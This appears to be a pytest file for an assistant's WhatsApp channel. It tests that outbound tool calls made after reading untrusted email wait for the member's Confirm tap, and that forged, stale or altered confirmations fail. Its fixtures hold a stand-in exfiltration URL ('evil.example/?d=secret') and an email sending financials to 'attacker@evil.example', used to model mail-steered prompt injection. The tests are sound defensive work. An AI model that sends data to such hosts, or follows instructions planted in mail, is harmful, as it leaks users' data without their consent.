"""WS-47 WAC-P4 — the Confirm of an egress call after an untrusted answer.

Spec: ``project-docs/specs/whatsapp_assistant_channel.md`` §17.3 and §17.5.

The defect (production, 2026-10-15 to 2026-10-19). After the email assistant
answered once, the thread carried the untrusted-answer mark (EM-G11d), and
each later egress call needed the member's card. WhatsApp shows no card, so
the call was refused (``permission.untrusted_answer_refused
outcome=no_card_channel``, 6 times in 4 days). The fix asks the same
question through the WAC-4 Confirm and Cancel buttons, where the gateway
records the member's tap.

The REAL webhook route, ``bot_run``, ``acts.settle``, the REAL injection
seam wrapper (``_tool_injection._gate_injected_tool``), the REAL permission
policy and the REAL mark reader (``acb_skills.egress``) run here. The fakes
are those of ``test_wac_writes.py``: the act table in memory with row level
security, the Meta provider, and the mark store of ``tests/conftest.py``.

R7 fences named here:

* ``wacp4-park-then-confirm``: the call parks, reaches nothing, and ONE
  Confirm lets exactly that call run once.
* ``wacp4-forged``: no Confirm buttons, a typed Confirm with no act, a call
  with other arguments, and a yes outside a WhatsApp run approve nothing.
* ``wacp4-bound``: another phone, another org, a stale tap and an expired act
  approve nothing.
* ``wacp4-room``: a room settles no act.
* ``wacp4-batch-refuses``: a run with no member and no channel still refuses.
* ``wacp4-view``: the member sees every recipient, the subject and each
  attachment of the call, first and whole, on WhatsApp and on the web card.
  A call whose key fields do not fit asks no yes (review P1-1).
* ``wacp4-mark-sticky``: a WhatsApp mark never ends while the thread lives,
  as on the web (review P1-2).
"""
# ruff: noqa: F811 - `env` and `world` are fixtures that a test names
from __future__ import annotations

from typing import Any

import orchestrator._tool_injection as ti
import pytest
from acb_common.db import bind_tenant, release_tenant
from acb_skills import egress
from acb_skills import whatsapp_acts as wacts
from acb_skills import whatsapp_ui as wui
from acb_skills.write_artifact import artifact_context_scope, bind_artifact_context
from gateway.routes.whatsapp_channel import acts, bot_run

from tests.unit.test_wac_bot_run import (  # noqa: F401 - `world` is a fixture
    MEMBER,
    ORG_A,
    ORG_B,
    _message,
    _post_and_run,
    world,
)
from tests.unit.test_wac_writes import (  # noqa: F401 - `env` is a fixture
    PHONE_2,
    _Env,
    _switches,
    _tap,
    _texts,
    env,
)

URL = "https://example.com/quote"
EVIL = "https://evil.example/?d=secret"
ASK = "Open the link in that mail"
READY = "It waits for your Confirm."

#: Each call that reached the egress tool, in order.
REACHED: list[dict[str, Any]] = []


async def fetch_page(url: str) -> str:
    """Fetch one web page. An egress tool: it reaches outside Metorite."""
    REACHED.append({"url": url})
    return f"The page at {url}."


@pytest.fixture(autouse=True)
def _reached() -> None:
    REACHED.clear()
    yield
    REACHED.clear()


class _EgressAgent:
    """``run_agent`` that calls the REAL gated egress tool, as a run does.

    Each run binds the artifact context the executor binds (the thread, the
    member). With *mark*, the run first marks its thread, as the email
    assistant's answer does. Each script entry is the arguments of one call,
    a list of them, or None for no call."""

    def __init__(self, *script: Any, mark: bool = True) -> None:
        self.script = list(script)
        self.mark = mark
        self.tool = ti._gate_injected_tool(fetch_page)
        self.seen: list[dict[str, Any]] = []
        self.outputs: list[str] = []

    async def __call__(self, agent: str, payload: dict[str, Any], **kw: Any) -> Any:
        self.seen.append({"payload": payload, "run": wui.current_run()})
        entry = self.script.pop(0) if self.script else None
        calls = entry if isinstance(entry, list) else [entry] if entry else []
        with artifact_context_scope():
            bind_artifact_context(session_id=kw["thread_id"], agent_name="orchestrator",
                                  run_id=kw["run_id"], member=kw["session_user"])
            if self.mark:
                assert await egress.mark_untrusted_answer()
            for args in calls:
                self.outputs.append(str(await self.tool(**args)))
        return {"result": READY}


async def _ask(env: _Env, args: dict[str, Any] | None = None) -> None:
    env.world.agent = _EgressAgent(dict(args or {"url": URL}))
    await _post_and_run(_message(ASK))


def _act(env: _Env) -> dict[str, Any]:
    (row,) = [r for r in env.acts.rows.values()
              if wacts.is_egress_act(r["tool_name"])]
    return row


# ── The ask parks the call ──────────────────────────────────────────────────


async def test_a_marked_egress_call_parks_and_reaches_nothing(env: _Env) -> None:
    await _ask(env)

    assert REACHED == [], "the call reached outside before the Confirm"
    assert env.world.agent.outputs == [wacts.EGRESS_PARKED_TEXT]
    row = _act(env)
    assert row["state"] == "pending" and row["org"] == ORG_A
    assert row["member_email"] == MEMBER
    assert row["tool_name"] == "egress__fetch_page"
    assert row["arguments"] == {"url": URL}
    assert row["card_text"] == wacts.egress_card_text("fetch_page", {"url": URL})
    assert env.prov.buttons == [["Confirm", "Cancel"]]
    summary = next(t for t in _texts(env) if t.startswith("*Run fetch_page?"))
    assert URL in summary and "email assistant" in summary


async def test_one_confirm_runs_exactly_the_confirmed_call_once(env: _Env) -> None:
    await _ask(env)
    env.world.agent.script.append({"url": URL})
    await _post_and_run(_tap("Confirm", of=env.prov.button_wamids[-1]))

    assert REACHED == [{"url": URL}]
    assert _act(env)["state"] == "done"
    turn = env.world.agent.seen[-1]["payload"]["message"]
    assert turn.startswith("Confirm") and "tapped Confirm" in turn and URL in turn
    # The yes ended with the run.
    assert wacts._APPROVING.get() is None

    # A second Confirm, or the same tap again, finds no act and runs nothing.
    env.world.agent.script.append({"url": URL})
    await _post_and_run(_message("Confirm"))
    assert REACHED == [{"url": URL}], "a second Confirm ran the call again"


async def test_cancel_closes_the_act_and_nothing_reaches_out(env: _Env) -> None:
    await _ask(env)
    await _post_and_run(_tap("Cancel"))

    assert REACHED == []
    assert _act(env)["state"] == "cancelled"
    assert _texts(env)[-1] == acts.REPLY_CANCELLED


# ── wacp4-forged ────────────────────────────────────────────────────────────


async def test_a_typed_confirm_with_no_act_approves_nothing(env: _Env) -> None:
    """The member's "Confirm" names no call. With no act, the run is a
    normal run, and its egress call parks again."""
    env.world.agent = _EgressAgent({"url": URL})
    await _post_and_run(_message("Confirm"))

    assert REACHED == []
    assert env.world.agent.outputs == [wacts.EGRESS_PARKED_TEXT]
    assert _act(env)["state"] == "pending"


async def test_a_call_with_other_arguments_at_confirm_is_not_approved(env: _Env) -> None:
    """A mail could steer the run that the Confirm starts. The yes binds the
    tool AND every argument, so another URL parks as a new act and shows
    the member its own summary."""
    await _ask(env)
    env.world.agent.script.append({"url": EVIL})
    await _post_and_run(_tap("Confirm", of=env.prov.button_wamids[-1]))

    assert REACHED == [], "a call the member never saw was approved"
    states = sorted((r["arguments"]["url"], r["state"], r["code"])
                    for r in env.acts.rows.values())
    assert states == [(EVIL, "pending", None), (URL, "void", "unused")]
    assert len(env.prov.buttons) == 2


async def test_the_yes_lets_one_call_run_and_no_second(env: _Env) -> None:
    await _ask(env)
    env.world.agent.script.append([{"url": URL}, {"url": URL}])
    await _post_and_run(_tap("Confirm", of=env.prov.button_wamids[-1]))

    assert REACHED == [{"url": URL}]
    assert env.world.agent.outputs[-1] == wacts.EGRESS_PARKED_TEXT


async def test_a_yes_never_reaches_a_run_with_no_whatsapp_profile() -> None:
    card = wacts.egress_card_text("fetch_page", {"url": URL})
    with wacts.approving(card):
        assert wacts.answer_egress("fetch_page", {"url": URL}) is None
    with wui.whatsapp_run("orchestrator", writes=True):
        # The yes closed with its scope: a task that outlived it gets none.
        assert wacts.answer_egress("fetch_page", {"url": URL}) == wacts.EGRESS_PARKED


async def test_a_yes_that_closed_approves_nothing() -> None:
    card = wacts.egress_card_text("fetch_page", {"url": URL})
    with wui.whatsapp_run("orchestrator", writes=False):
        with wacts.approving(card) as yes:
            pass
        assert yes.closed and not yes.used
        token = wacts._APPROVING.set(yes)
        try:
            assert wacts.answer_egress("fetch_page", {"url": URL}) is None
        finally:
            wacts._APPROVING.reset(token)


async def test_the_model_cannot_offer_the_confirm_buttons() -> None:
    """Only code offers Confirm (WAC-4 W6), so a model that a mail steers
    cannot build a button that looks like the member's yes."""
    with wui.whatsapp_run("orchestrator", writes=True) as run:
        out = await wui.whatsapp_ui("buttons", {"body": "Go?", "buttons": ["Confirm", "No"]})
    assert out["ok"] is False and run.outbox == []


# ── wacp4-bound ─────────────────────────────────────────────────────────────


async def test_a_confirm_from_another_phone_approves_nothing(env: _Env) -> None:
    await _ask(env)
    env.world.agent.script.append({"url": URL})
    await _post_and_run(_message("Confirm", sender=PHONE_2))

    assert REACHED == []
    # The other phone's "Confirm" ran as a normal message, and its own call
    # parked for ITS buttons. The first phone's act is untouched.
    other = [r["state"] for r in env.acts.rows.values() if r["wa_id"] == PHONE_2]
    assert other == ["pending"]
    first = [r for r in env.acts.rows.values() if r["wa_id"] != PHONE_2]
    assert [r["state"] for r in first] == ["pending"], "another phone touched the act"


async def test_a_confirm_after_an_org_switch_approves_nothing(env: _Env) -> None:
    """Org B never sees org A's act (row level security), so the Confirm is
    a normal message of org B, and its call parks there."""
    await _ask(env)
    env.world.links = [
        {"organization_id": ORG_A, "member_email": MEMBER, "is_current": False},
        {"organization_id": ORG_B, "member_email": MEMBER, "is_current": True},
    ]
    env.world.identity = ("uid-1", ORG_B)
    env.world.agent.script.append({"url": URL})
    await _post_and_run(_message("Confirm"))

    assert REACHED == []
    rows = {r["org"]: r["state"] for r in env.acts.rows.values()}
    assert rows == {ORG_A: "pending", ORG_B: "pending"}


async def test_a_tap_on_another_card_is_stale_and_approves_nothing(env: _Env) -> None:
    await _ask(env)
    env.world.agent.script.append({"url": URL})
    await _post_and_run(_tap("Confirm", of="wamid.an-older-card"))

    assert REACHED == []
    assert _act(env)["state"] == "pending"
    assert _texts(env)[-1] == acts.REPLY_STALE


async def test_a_confirm_after_10_minutes_approves_nothing(env: _Env) -> None:
    await _ask(env)
    env.acts.now += acts.ACT_TTL_S + 1
    env.world.agent.script.append({"url": URL})
    await _post_and_run(_tap("Confirm", of=env.prov.button_wamids[-1]))

    assert REACHED == []
    assert _act(env)["state"] == "expired"
    assert _texts(env)[-1] == acts.REPLY_EXPIRED


# ── wacp4-room ──────────────────────────────────────────────────────────────


async def test_a_confirm_in_a_thread_that_became_a_room_approves_nothing(
    env: _Env, monkeypatch: pytest.MonkeyPatch,
) -> None:
    await _ask(env)
    seen: list[str] = []

    async def _room(sid: str) -> bool:
        seen.append(sid)
        return len(seen) > 1

    monkeypatch.setattr(bot_run, "_thread_shared", _room)
    env.world.agent.script.append({"url": URL})
    first = _act(env)["id"]
    await _post_and_run(_tap("Confirm", of=env.prov.button_wamids[-1]))

    assert REACHED == []
    # No settle ran: the act was never claimed. (The room's own run parked a
    # new act, which replaced it.)
    assert env.acts.rows[first]["state"] in ("pending", "void")
    assert env.acts.rows[first]["code"] in (None, "replaced")
    # The room's answer is refused, so no new act ever reaches a phone.
    later = [r for r in env.acts.rows.values() if r["id"] != first]
    assert all(r["offered_seq"] is None for r in later)
    assert len(env.prov.buttons) == 1


# ── wacp4-batch-refuses, and the switch ─────────────────────────────────────


async def test_a_run_with_no_member_and_no_channel_still_refuses() -> None:
    tool = ti._gate_injected_tool(fetch_page)
    token = bind_tenant(ORG_A)
    try:
        with artifact_context_scope():
            bind_artifact_context(session_id="batch-thread", agent_name="orchestrator",
                                  run_id="r1", member="", batch_thread=True)
            assert await egress.mark_untrusted_answer()
            card = wacts.egress_card_text("fetch_page", {"url": URL})
            with wacts.approving(card):
                out = await tool(url=URL)
    finally:
        release_tenant(token)
    assert out == ti.UNTRUSTED_ANSWER_REFUSED.format(tool="fetch_page")
    assert REACHED == []


async def test_with_writes_off_the_call_is_refused_as_before(
    env: _Env, monkeypatch: pytest.MonkeyPatch,
) -> None:
    _switches(monkeypatch, native=True, writes=False)
    await _ask(env)

    assert REACHED == []
    assert env.world.agent.outputs == [ti.UNTRUSTED_ANSWER_REFUSED.format(tool="fetch_page")]
    assert env.acts.rows == {} and env.prov.buttons == []


# ── wacp4-view (review P1-1) ────────────────────────────────────────────────

#: A model put a long body FIRST. The first 600 characters of the JSON were
#: the body alone, so "to" and the attachment never showed.
_MAIL = {"body": "Hi team, the quarterly summary follows. " * 18,
         "subject": "Q3", "to": "attacker@evil.example",
         "cc": ["boss@fracktal.in"], "attachments": [{"name": "q3_financials.xlsx"}]}
_KEYS = ("attacker@evil.example", "boss@fracktal.in", "q3_financials.xlsx", "Q3")


async def _web_card_context(monkeypatch: pytest.MonkeyPatch, args: dict[str, Any]) -> str | None:
    """The context of the web card that the seam asks, or None when it asks none."""
    from acb_skills import ask_tools

    asked: list[str] = []

    async def _confirm(title: str, detail: str, context: str = "", **_kw: Any) -> bool:
        asked.append(context)
        return False

    monkeypatch.setattr(ti, "_untrusted_answer_card_refusal", lambda: None)
    monkeypatch.setattr(ask_tools, "request_confirmation", _confirm)
    assert await ti._untrusted_answer_card("send_email", args) is False
    return asked[0] if asked else None


async def test_every_recipient_and_attachment_shows_first_on_whatsapp_and_the_web(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    assert len(_MAIL["body"]) > 700
    with wui.whatsapp_run("orchestrator", org=ORG_A, writes=True) as run:
        assert wacts.answer_egress("send_email", dict(_MAIL)) == wacts.EGRESS_PARKED
    summary = wacts.summary(run.parked)
    web = await _web_card_context(monkeypatch, dict(_MAIL))
    for text in (summary, web):
        assert text is not None
        for value in _KEYS:
            assert value in text, (value, text[:200])
        # The key fields come before the body, and the body is cut.
        assert text.index("attacker@evil.example") < text.index("quarterly summary")
        assert "…" in text
    assert len(run.parked.context) <= wacts.EGRESS_VIEW_CHARS
    assert "attacker@evil.example" in run.parked.card


def test_the_order_of_the_arguments_never_changes_the_view() -> None:
    from acb_skills.egress import egress_call_view

    flipped = dict(reversed(list(_MAIL.items())))
    assert egress_call_view("send_email", _MAIL, 1024) == egress_call_view(
        "send_email", flipped, 1024)


def test_a_nested_recipient_shows_and_one_in_a_list_asks_no_yes() -> None:
    from acb_skills.egress import egress_call_view

    nested = {"message": {"body": "x" * 900, "to": "a@evil.example"}}
    assert "message.to: a@evil.example" in (egress_call_view("send", nested, 1024) or "")
    listed = {"messages": [{"body": "x", "to": "a@evil.example"}]}
    assert egress_call_view("send", listed, 1024) is None


async def test_recipients_too_long_for_the_channel_ask_no_yes(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    many = {"body": "Hi", "to": [f"person{i}@example.com" for i in range(60)]}
    with wui.whatsapp_run("orchestrator", org=ORG_A, writes=True) as run:
        assert wacts.answer_egress("send_email", many) == wacts.EGRESS_TOO_LONG
    assert run.parked is None
    held = ti._untrusted_answer_hold_sync("send_email", many)
    assert held is not None and "did not run" in held
    huge = {"to": [f"person{i}@example.com" for i in range(300)]}
    assert await _web_card_context(monkeypatch, huge) is None


async def test_a_too_long_call_on_whatsapp_tells_the_member_to_use_the_web_app(
    env: _Env,
) -> None:
    many = {"url": URL, "to": [f"person{i}@example.com" for i in range(60)]}
    await _ask(env, many)

    assert REACHED == []
    (out,) = env.world.agent.outputs
    assert out == wacts.EGRESS_TOO_LONG_TEXT.format(tool="fetch_page")
    assert "web app" in out
    assert env.acts.rows == {} and env.prov.buttons == []


# ── wacp4-mark-sticky (review P1-2) ─────────────────────────────────────────


async def test_a_mark_whose_turn_left_the_replay_still_parks_the_call(env: _Env) -> None:
    """Decision of review P1-2: a WhatsApp mark is sticky, as on the web.
    The member pays one tap for each egress call, and the call still works
    through the Confirm. Here the marking turn is 30 rows behind, far past
    the replay of :data:`bot_run.HISTORY_TURNS`."""
    env.world.agent = _EgressAgent(None)
    await _post_and_run(_message("Read my mail"))
    (sid,) = env.world.store.threads
    for i in range(30):
        env.world.store.threads[sid].append(
            {"id": f"old-{i}", "role": ("user", "assistant")[i % 2], "content": "ok"})
    assert bot_run.HISTORY_TURNS < 30
    env.world.agent.mark = False
    env.world.agent.script.append({"url": URL})
    await _post_and_run(_message(ASK))

    assert REACHED == [], "an old mark let the call reach out with no Confirm"
    assert env.world.agent.outputs[-1] == wacts.EGRESS_PARKED_TEXT
    assert _act(env)["state"] == "pending"


def test_no_code_reads_a_replay_horizon_for_the_mark() -> None:
    import inspect

    src = inspect.getsource(egress) + inspect.getsource(bot_run) + inspect.getsource(wui)
    for word in ("replay_horizon", "replay_clear_before", "_left_replay"):
        assert word not in src, word
